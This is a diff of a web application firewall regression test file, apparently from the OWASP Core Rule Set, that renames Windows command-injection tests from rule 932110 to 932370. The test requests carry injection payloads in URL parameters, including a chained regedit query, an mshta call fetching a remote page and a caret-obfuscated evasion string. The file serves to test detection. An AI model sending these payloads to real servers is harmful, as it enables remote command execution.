@@ -3,9 +3,9 @@ meta:
   author: airween, Franziska Bühler
   description: "Remote Command Execution: Windows Command Injection test cases"
   enabled: true
-  name: 932110.yaml
+  name: 932370.yaml
 tests:
-  - test_title: 932110-1
+  - test_title: 932370-1
     desc: "Windows Command Injection true positive test"
     stages:
       - stage:
@@ -21,8 +21,8 @@ tests:
             uri: /?cmd=%3B%regedit%20HKLM%5CSoftware%5CMicrosoft%5CWindowsNT%5CCurrentVersion%5CProfileList
             version: HTTP/1.0
           output:
-            log_contains: id "932110"
-  - test_title: 932110-2
+            log_contains: id "932370"
+  - test_title: 932370-2
     desc: "Windows Command Injection true negative test"
     stages:
       - stage:
@@ -38,8 +38,8 @@ tests:
             uri: /?cmd=format%20
             version: HTTP/1.0
           output:
-            no_log_contains: id "932110"
-  - test_title: 932110-3
+            no_log_contains: id "932370"
+  - test_title: 932370-3
     desc: "Windows Command Injection - bypass test"
     stages:
       - stage:
@@ -55,8 +55,8 @@ tests:
             uri: /?cmd=;%20mshta%20http://example.com
             version: HTTP/1.0
           output:
-            log_contains: id "932110"
-  - test_title: 932110-4
+            log_contains: id "932370"
+  - test_title: 932370-4
     desc: Windows Command Injection bypass with time
     stages:
       - stage:
@@ -73,8 +73,8 @@ tests:
             uri: "/?foo=time+cmd"
             version: HTTP/1.1
           output:
-            log_contains: "id \"932110\""
-  - test_title: 932110-5
+            log_contains: "id \"932370\""
+  - test_title: 932370-5
     desc: Windows Command Injection bypass with time negative test
     stages:
       - stage:
@@ -91,8 +91,8 @@ tests:
             uri: "/?foo=time+warner+"
             version: HTTP/1.1
           output:
-            no_log_contains: "id \"932110\""
-  - test_title: 932110-6
+            no_log_contains: "id \"932370\""
+  - test_title: 932370-6
     desc: Windows Command Injection test for BB finding 935E1D91
     stages:
       - stage:
@@ -109,8 +109,8 @@ tests:
             uri: "/?foo=time+winget+coreruleset.org"
             version: HTTP/1.1
           output:
-            log_contains: "id \"932110\""
-  - test_title: 932110-7
+            log_contains: "id \"932370\""
+  - test_title: 932370-7
     desc: Windows Command Injection test for BB finding 935E1D91 - evasion attempt
     stages:
       - stage:
@@ -127,4 +127,4 @@ tests:
             uri: "/?foo=ti^me+winget+coreruleset.org"
             version: HTTP/1.1
           output:
-            log_contains: "id \"932110\""
+            log_contains: "id \"932370\""
